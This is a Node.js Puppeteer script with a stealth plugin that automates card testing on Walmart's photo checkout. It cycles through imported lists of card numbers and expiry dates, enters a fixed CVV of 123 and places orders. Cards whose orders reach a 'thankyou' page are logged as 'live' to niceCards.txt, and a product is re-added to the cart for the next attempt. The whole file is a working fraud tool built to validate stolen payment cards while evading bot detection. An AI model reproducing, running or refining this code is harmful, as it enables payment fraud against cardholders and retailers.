const puppeteer = require('puppeteer-extra');
const { cards, fechaMes, fechaAño,carritoWalmart } = require('../cards/porUsar');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
puppeteer.use(StealthPlugin());


const foto = async () => {
    let r    = 0;
    countl   = 0;
    contador = 1
    let page2;

    const browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        userDataDir: './userData',
        args: ['--start-maximized', '--disable-gpu', '--disable-dev-shm-usage', '--disable-setuid-sandbox', '--no-sandbox']
    });
    const page = (await browser.pages())[0];
    await page.setDefaultTimeout(0);
    await page.setDefaultNavigationTimeout(0); 

    for (var i=0; i<=cards.length;++i) {
        console.log(contador," ", cards[i]);
        await page.bringToFront();
        await page.goto('https://www.walmart.com/checkout/photo#/payment');
        await page.waitForTimeout(3000);


        const deleteCard = await page.$('body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span');
        if (deleteCard) {
            await page.waitForSelector('body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span');
            await page.click('body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span');
            await page.waitForSelector('body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span');
            await page.click('body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span');
            await page.waitForSelector('#firstName');
            //await page.goto('https://www.walmart.com/checkout/photo#/payment');
            //await page.waitFor(3000);
        }
        // And save this data to a JSON file
        const firstName = await page.$('#firstName');
        await page.waitForTimeout(2000);
        if (firstName) {
            await page.type('#creditCard', `${cards[i]}`);
            await page.type('#month-chooser', `${fechaMes[i]}`);
            if (fechaAño[i]==22) {
                await page.type('#year-chooser', `${21}`);
            }
            else{
                await page.type('#year-chooser', `${fechaAño[i]}`);
            }
            await page.type('#cvv', '123');    
            await page.click('body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div > div > div > form > div.edit-form-actions > div > button');
            await page.waitForTimeout(3000);
        }
        if (r==0){
            page2 = await browser.newPage();
        }
        await page2.bringToFront();
        await page2.waitForTimeout(2000); 
        await page2.goto(carritoWalmart);
        await page2.waitForSelector('#react-aria-4'); 
        const cvv2 = await page2.$('#react-aria-4');
        
        if (cvv2) {
            await page2.type('#react-aria-4', '123');
            await page2.click('#mobile-sticky-footer > div > section > button');
            await page2.waitForTimeout(7000);
            const error = await page2.$('body > div:nth-child(18) > div > div.w_HB > div.w_GY.w_GZ > div > div.w_Gh > div > div > div.w_Q.w_U.mb1');
            //if (!error) {
              //  cardNice = card;
              //  return console.log('La tarjeta aprobada fue', cardNice);
          // };
        var urlcheck = await page2.mainFrame().url();
        if (urlcheck.search("thankyou") != -1) {
            countl ++;
            console.log("live: ",countl);
            fs.appendFile('niceCards.txt',cards[i]+'\n',{encoding: 'utf8'}, (error) =>{
                if (error) {
                    console.log('Error:',error);
                }
            });
            //producto para probar en el carrito
            await page2.goto('https://www.walmart.com/ip/seort/10448549');
            await page2.waitForSelector('.dib button');
            await page2.waitForSelector('.dib button');
            await page2.waitForTimeout(3000);
            await page2.click('body'); 
            await page2.click('.dib button'); 
            await page2.waitForTimeout(3000);   
            await page2.goto('https://www.walmart.com/cart');
            await page2.waitForSelector('.flex .sticky .shadow-1 div .ph3  button');
            await page2.click('.flex .sticky .shadow-1 div .ph3  button');
            await page2.waitForTimeout(7000);
        }
        if (page2){
            r = 1
        }
        contador ++;
        }
    }
}

module.exports = {foto};